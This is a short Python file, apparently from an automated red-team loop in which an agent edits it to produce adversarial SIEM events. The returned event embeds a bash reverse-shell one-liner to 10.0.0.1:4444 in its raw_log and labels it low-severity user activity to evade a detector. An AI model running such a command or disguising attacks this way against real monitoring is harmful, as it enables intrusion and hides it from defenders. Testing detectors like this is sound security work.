"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 8: reverse shell + user_activity evasion + phantom IPs
    return {
        "task_type": "user_activity",
        "severity": "low",
        "siem_event": {
            "title": "User Session Activity",
            "source_ip": "10.20.30.40",
            "destination_ip": "10.20.30.50",
            "username": "jsmith",
            "hostname": "ws-jsmith-01",
            "rule_name": "UserSessionLog",
            "raw_log": (
                "EventID=4688 Process=bash "
                "CommandLine=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 "
                "reverse shell connection established to C2 "
                "User=jsmith ParentProcess=cron"
            ),
        },
    }
